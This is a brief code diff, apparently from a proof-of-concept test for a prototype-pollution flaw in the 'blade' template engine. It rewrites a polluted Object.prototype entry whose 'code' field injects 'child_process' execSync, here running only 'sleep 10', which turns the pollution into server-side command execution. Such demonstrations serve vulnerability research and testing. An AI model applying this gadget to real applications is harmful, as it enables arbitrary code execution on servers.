@@ -3,10 +3,11 @@ const blade = require('blade');
 /**
  * prototype pollution
  */
-Object.prototype.b = {}
-Object.prototype.b.name = "somename"
-Object.prototype.b.value = "somevalue"
-Object.prototype.b.code = "process.mainModule.require('child_process').execSync(\`sleep 10\`)"
+Object.prototype.obj = {
+    name: "somename",
+    value: "somevalue",
+    code: "process.mainModule.require('child_process').execSync(`sleep 10`)"
+}
 
 const template = `html
     head
